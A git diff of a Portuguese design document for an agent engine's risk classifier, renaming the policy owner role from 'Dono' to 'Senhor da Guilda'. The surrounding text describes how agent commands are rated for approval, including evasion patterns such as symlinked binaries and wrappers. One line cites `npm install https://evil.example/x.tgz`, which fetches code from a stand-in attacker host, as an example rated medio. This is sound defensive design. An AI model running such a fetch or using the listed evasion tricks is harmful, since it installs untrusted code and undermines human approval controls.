@@ -1,6 +1,6 @@
 # Classificação de risco
 
-> **Assunto:** o risco de cada pedido de aprovação (`baixo`, `medio`, `alto`, `fixo`), dado pelo motor a partir do tipo da ação e do alvo: tabela padrão, lista de programas seguros, sinais de risco, risco dos tipos de pedido, ajustes do Dono no arquivo de política, padrões aprováveis e o que eles cobrem · **Componente:** Motor · **Atualizado:** 2026-10-19
+> **Assunto:** o risco de cada pedido de aprovação (`baixo`, `medio`, `alto`, `fixo`), dado pelo motor a partir do tipo da ação e do alvo: tabela padrão, lista de programas seguros, sinais de risco, risco dos tipos de pedido, ajustes do Senhor da Guilda no arquivo de política, padrões aprováveis e o que eles cobrem · **Componente:** Motor · **Atualizado:** 2026-10-19
 
 ## Objetivo
 
@@ -12,7 +12,7 @@ Dar a cada pedido de aprovação um **risco**, que diz até onde ele pode ser de
 
 - As regras decidem primeiro: regras fixas, exceções e regras efetivas ([pipeline](permissoes.md#pipeline-de-decisão)). Só o que termina em `ask` é classificado; o que as regras fixas negam nunca vira pedido. O `ask` que vem só de nenhuma regra cobrir a ação e sai `baixo` roda direto, sem pedido ([ADR 0025](../decisoes/0025-padroes-seguem-os-provedores.md)); o resto vira pedido.
 - O risco é calculado uma vez, quando o pedido nasce, e fica gravado nele; subir na cadeia não o muda. Alvo que muda é pedido novo, classificado de novo.
-- **Entradas:** o tipo do pedido; para `permissao_de_classe`, a ação normalizada do [adaptador](../provedores/adaptador.md#formato-interno-normalizado-de-evento) (tipo de ferramenta, comando, caminhos, URL, nome nativo), a raiz do worktree e os domínios das regras efetivas; os ajustes do Dono. A justificativa do agente não entra.
+- **Entradas:** o tipo do pedido; para `permissao_de_classe`, a ação normalizada do [adaptador](../provedores/adaptador.md#formato-interno-normalizado-de-evento) (tipo de ferramenta, comando, caminhos, URL, nome nativo), a raiz do worktree e os domínios das regras efetivas; os ajustes do Senhor da Guilda. A justificativa do agente não entra.
 - **Saída:** o risco, a versão da tabela padrão (`risk_table_version`, embutida no binário) e a linha ou o ajuste que decidiu; os três vão para o pedido e para a auditoria.
 - Quem decide cada risco, e como o pedido sobe, está na [cadeia de aprovação](../orquestracao/cadeia-de-aprovacao.md) (M4).
 - O código é `internal/classes` (`ClassifyRisk`, `ParseRiskAdjustments`, `CheckApprovablePattern`, `PatternCovers`). No M3 os ajustes entram como dado; o arquivo de política que os carrega chega no M5 e usa `LoadRiskAdjustments` (inválido: fica a versão anterior). O `ask` do pipeline sai já classificado (`Decision.Risk`), e o despachante abre o pedido com ele (`ApprovalRequest.Risk`); em modo degradado não há pedido nem classificação.
@@ -48,7 +48,7 @@ Dar a cada pedido de aprovação um **risco**, que diz até onde ele pode ser de
 | `medio` | envio da branch da mesa: `mestre pr open*`, `mestre pr update*` (o pedido da classe sem `git.request_push`, [formato](formato-das-permissoes.md#cli-mestre)) |
 | `medio` | contêineres e serviços: `docker *`, `podman *`, `docker-compose *`, `systemctl *`, `service *`, `launchctl *`, `sc *`, `Stop-Service*`, `Start-Service*` |
 
-Sem linha `baixo`: os pacotes, scripts, ferramentas e arquivos do projeto (`npm install`, `npm run *`, `make *`, `go test`, `cp`, `rm` sem `-r`…) estão na [lista de seguros](lista-de-seguros.md#o-que-está-na-lista), com as formas de cada um (`make *` e `npm run *` ficam `baixo` por decisão do Dono, embora o script possa fazer qualquer coisa).
+Sem linha `baixo`: os pacotes, scripts, ferramentas e arquivos do projeto (`npm install`, `npm run *`, `make *`, `go test`, `cp`, `rm` sem `-r`…) estão na [lista de seguros](lista-de-seguros.md#o-que-está-na-lista), com as formas de cada um (`make *` e `npm run *` ficam `baixo` por decisão do Senhor da Guilda, embora o script possa fazer qualquer coisa).
 
 ### Sinais de risco
 
@@ -64,7 +64,7 @@ O que leva a `medio` (ou mais) uma parte sem linha na tabela e dá a origem do `
 - **programa criado na mesma linha:** um programa escrito antes na mesma linha (redirecionamento, `cp`, `install`, `chmod +x` de um arquivo novo e afins) é ilegível para o resto da linha, no mínimo `medio`; um link ou cópia de um programa (`ln -s /usr/bin/git g && ./g push`) é classificado como esse programa, e criar um link é escrita do link e, por ele, do alvo (resolvido da pasta do link);
 - **script alterado na mesa:** o script do worktree que a parte roda (o programa dado por caminho, `./scripts/x.sh`, ou o arquivo que um interpretador ou shell roda, `python x.py`, `bash x.sh`, `source x.sh`) só é "do projeto" se veio do repositório: conteúdo igual, a menos dos fins de linha, ao do mesmo caminho na **base da branch da mesa**, o merge-base dela com a branch principal (em cada base, se a branch trouxe a principal por merge). Criado na mesa (rastreado, não rastreado ou ignorado), alterado no worktree ou em commit da branch, link para fora do worktree, arquivo que não é regular ou acima de 1 MiB: `medio`; sem o estado do git, todo script do worktree é `medio`, e também quando o worktree não aponta mais para o registro do motor (alerta, [git do motor](../arquitetura/seguranca.md#git-do-motor)). O launcher não lava o script: as opções do interpretador são puladas (`bash -x x.sh`, `sh -e`, `python -u`, `node --inspect`, `pwsh -File`), os nomes com versão são normalizados (`python3.11`, `pypy3`, `node20`) e os invólucros são desembrulhados (`strace`, `uv run`, `poetry run`, `deno run`, `bun run <arquivo>`). Vale por cima das linhas e dos ajustes, como os caminhos; `make *` e `npm run *` seguem a linha.
 
-A rede para domínio não listado e a instalação global valem também por cima da lista de seguros (`npm install x -g` e `npm install https://evil.example/x.tgz` são `medio`), não por cima de um ajuste do Dono. A lista exata fica no código (`internal/classes`, `risksignal.go`).
+A rede para domínio não listado e a instalação global valem também por cima da lista de seguros (`npm install x -g` e `npm install https://evil.example/x.tgz` são `medio`), não por cima de um ajuste do Senhor da Guilda. A lista exata fica no código (`internal/classes`, `risksignal.go`).
 
 ### Outras ferramentas
 
@@ -84,9 +84,9 @@ Só `shell`, `web`, `mcp`, `subagent` e `other` chegam a `ask` (arquivos não t�
 | `ativacao_operador`, `atualizacao_mestre`, `entrada_na_guilda`, `promocao_cidadela` | `fixo`: fora da cadeia, com a regra própria do tipo na política |
 | tipo desconhecido | `alto` |
 
-### Ajustes do Dono
+### Ajustes do Senhor da Guilda
 
-Na seção `risco` do [arquivo de política](../aprovacoes/arquivo-de-politica.md), editado só pelo Dono:
+Na seção `risco` do [arquivo de política](../aprovacoes/arquivo-de-politica.md), editado só pelo Senhor da Guilda:
 
 ```yaml
 risco:
@@ -99,10 +99,10 @@ risco:
 
 - `comando` casa como os padrões de `commands`; `ferramenta`, como os de `tools`. O primeiro ajuste que casa decide a parte; sem ajuste, vale a tabela padrão. O ajuste toma o lugar da linha: a regra de caminhos e o mínimo `medio` do que não se analisa continuam valendo por cima.
 - Cada item tem `risco` e só um de `comando` e `ferramenta`; qualquer outra chave (inclusive `tipo`: o risco dos tipos não se ajusta) é inválida.
-- **Válidos:** subir qualquer padrão; descer só de `medio` para `baixo` (e voltar), o que põe um programa na [lista de seguros](lista-de-seguros.md#como-o-dono-estende), nunca código: interpretador ou shell sem script, forma que passa código, comando dentro de argumento (inválido como 3).
+- **Válidos:** subir qualquer padrão; descer só de `medio` para `baixo` (e voltar), o que põe um programa na [lista de seguros](lista-de-seguros.md#como-o-senhor-da-guilda-estende), nunca código: interpretador ou shell sem script, forma que passa código, comando dentro de argumento (inválido como 3).
 - **Inválidos** (o conjunto inteiro é recusado com o item e o motivo; com o arquivo, vale a versão anterior, como na [política](../aprovacoes/politica.md)):
   1. `risco: fixo`, ou um padrão que casa ação de regra fixa (`git push*`) ou um tipo `fixo`: o `fixo` nunca muda;
-  2. descer algo que a tabela padrão dá como `alto`, ou um padrão que pode casar um comando `alto` (conferência conservadora, como a do teto: `docker *` para `baixo` alcança `docker push`): o `alto` só se abre por delegação do Dono ([delegação](../aprovacoes/delegacao.md));
+  2. descer algo que a tabela padrão dá como `alto`, ou um padrão que pode casar um comando `alto` (conferência conservadora, como a do teto: `docker *` para `baixo` alcança `docker push`): o `alto` só se abre por delegação do Senhor da Guilda ([delegação](../aprovacoes/delegacao.md));
   3. `*` sozinho, um padrão de interpretador, invólucro ou runner com curinga (abaixo), ou descer código a `baixo`;
   4. qualquer chave que mude até onde cada nível decide: o formato não a tem, e o teto de risco dos agentes é fixo.
 - `nivel_minimo`: o nível mínimo das pessoas para cada risco (padrão: `alto: administrador`); vale o maior entre o do tipo e o do risco, e só sobe: abaixo do padrão é inválido.
